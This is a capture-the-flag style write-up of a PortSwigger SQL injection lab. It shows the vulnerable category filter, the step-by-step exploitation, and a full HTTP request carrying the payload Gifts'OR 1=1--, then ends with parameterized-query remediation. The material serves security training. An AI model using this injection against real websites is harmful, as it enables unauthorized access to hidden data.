
#portswigger #solution #sqli

- **Category:** **SQL injection**
- **Difficulty:** PRACTITIONER
- **URL Lab:** https://portswigger.net/web-security/learning-paths/sql-injection
- **Date Solved:** 2026-08-02

---

## 🎯 1. Lab Objective
> Perform an SQLi attack to retrieve all the products of the website

---

## 🔍 2. Reconnaissance & Vulnerability Analysis
* **Vulnerable Endpoint/Parameter:** ``GET /filter?category=Gifts HTTP/2``
* **Root Cause & Mechanism:** The dynamic SQL Query has been made up by concreting string of user's input in category parameter without sanitizing it:
  `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

---

## 🚀 3. Step-by-Step Exploitation

1. **Step 1:** Click on a category filter, e.g: 'Gifts' 
2. **Step 2:** Use Burp Suite to get the request `GET /filter?category=Gifts HTTP/2`
3. **Step 3:** Modify the category's parameter into `Gifts'OR 1=1 --`
4. **Step 4:** Send the request and get all products
![[Pasted image 20260802143814.png]]

---

## ⚡ 4. PoC / Final Payload

```http
GET /filter?category=Gifts'OR 1=1-- HTTP/2
Host: 0a3400380368c220802dc19400ab00dc.web-security-academy.net
Cookie: session=XMBM0DlkIP4VAS98SwHxyN8htZjxRkZz
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a3400380368c220802dc19400ab00dc.web-security-academy.net/filter?category=Gifts
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```
---
## 💡 5. Key Takeaways & Remediation

- **Key Concept:** Bypassing business logic filters and retrieving hidden data using basic boolean condition manipulation (`OR 1=1`) and comment characters (`--`).
- **Remediation:** Using parameterized query to separate the user's input from the query